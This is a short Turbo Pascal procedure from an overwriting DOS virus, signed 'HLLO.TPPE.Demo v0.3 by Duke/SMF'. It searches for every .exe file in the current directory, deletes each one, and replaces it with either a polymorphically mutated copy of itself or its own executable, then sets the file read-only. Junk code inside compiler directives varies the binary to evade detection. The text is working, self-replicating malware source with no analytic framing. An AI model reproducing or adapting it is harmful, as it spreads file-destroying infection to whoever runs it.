procedure Starting;
var s:searchrec;
begin
{$IFOPT S+}TPPE_Init;{$ENDIF}
findfirst('*.exe',$20,s);
{$IFOPT S-}TPPE_Init;{$ENDIF}
while doserror=0 do
  begin
  {$IFOPT B-}Junk1:=chr(ord(16));{$ENDIF}
  exec(Command,'/c del '+s.name+'>nul');
  {$IFOPT I-}Junk2:=4;{$ENDIF}
  if DetectComp then
    begin
    {$IFOPT F+}Junk3:=not Junk3;{$ENDIF}
    TPPE_Mutation;
    {$IFOPT L-}if Junk3 then Junk2:=1;{$ENDIF}
    exec(Command,'/c ren _tppe_.exe '+s.name+'>nul')
    {$IFOPT P+}inc(Junk2);{$ENDIF}
    end
  else exec(Command,'/c copy '+paramstr(0)+' '+s.name+'>nul');
  {$IFOPT T-}Junk1:=chr(Junk2 div 200);{$ENDIF}
  exec(Command,'/c attrib +r '+s.name+'>nul');
  {$IFOPT D+}Junk3:=False;{$ENDIF}
  findnext(s);
  end;
{$IFOPT N-}TPPE_Close;{$ENDIF}
Command:='[HLLO.TPPE.Demo v0.3 by Duke/SMF]';
{$IFOPT N+}TPPE_Close;{$ENDIF}
end;
